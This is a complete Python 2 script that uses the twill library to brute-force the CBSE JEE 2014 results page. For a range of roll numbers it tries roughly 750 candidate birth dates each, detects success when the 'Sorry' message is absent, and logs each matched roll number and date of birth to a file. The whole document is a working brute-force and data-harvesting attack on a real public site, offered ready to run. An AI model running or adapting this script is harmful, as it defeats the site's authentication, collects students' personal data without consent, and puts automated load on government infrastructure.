import twill
import datetime
from twill.commands import *
from BeautifulSoup import BeautifulSoup
import time
import os

#This is done to suppress twill output from showing up on terminal
t = open(os.devnull,"w")
twill.set_output(t)




def func():
	numdays=750
	base= datetime.datetime.strptime('Dec 31 1996  1:33PM', '%b %d %Y %I:%M%p')
	date_list = [base - datetime.timedelta(days=x) for x in range(0, numdays)]
	dates=[]
	for data in date_list:
		dates.append(data.strftime('%d/%m/%Y'))

	for reg in range(25020500,25020700,1):   #Specify a roll no range to brute force to
		regno=str(reg)
		m_95=[0,0,0,0,0,0,0,0,0,0,0,0,0]
		m_96=[0,0,0,0,0,0,0,0,0,0,0,0,0]
		m_94=[0,0,0,0,0,0,0,0,0,0,0,0,0]
		month=[m_95,m_96,m_94]
		print "===================================================================================="
		print "ATTEMPTING REGNO=%s" %regno
		count=-1
		while(count<749):
			count+=1
			d=int(dates[count][3:5])
			y=int(dates[count][9:10])-5
			if y==-1: #Condition necessary for year 1994
				y=2
			if month[y][d]==0:
				print "ATTEMPTING MONTH:%d/%d" %(d,int(dates[count][8:10]))
				month[y][d]=1
			
			#Often connection drops hence it is beneficial to put the connection part under a try
			#block so that program does not stop in such cases 

			try:
				go('http://cbseresults.nic.in/jee/jee_cbse_2014.htm')
				fv('1','regno',regno)
				fv('1','dob',dates[count])
				submit()
				res=show()
				if "Sorry" in res:  #If the combination is not right then page shows "Sorry Roll no not Valid"
					continue
				else: #If Sorry not found on page it means combination is correct
					print "regno=",regno
					print "DOB=",dates[count]
					with open("final_data.txt", "a") as f:    
						line='%s | %s \n' %(regno,dates[count])  #Appending this data
						f.write(line)
					break
			except:
				print "LOST CONNECTION: TRYING TO CONNECT AGAIN"
				count=count-1   #Connection dropped hence should try again for the previous DOB
				continue
	f.close() 


if __name__ == "__main__":
	print "Started at:",time.strftime("%Y-%m-%d %H:%M:%S")
	func()
	print "Finished at:",time.strftime("%Y-%m-%d %H:%M:%S")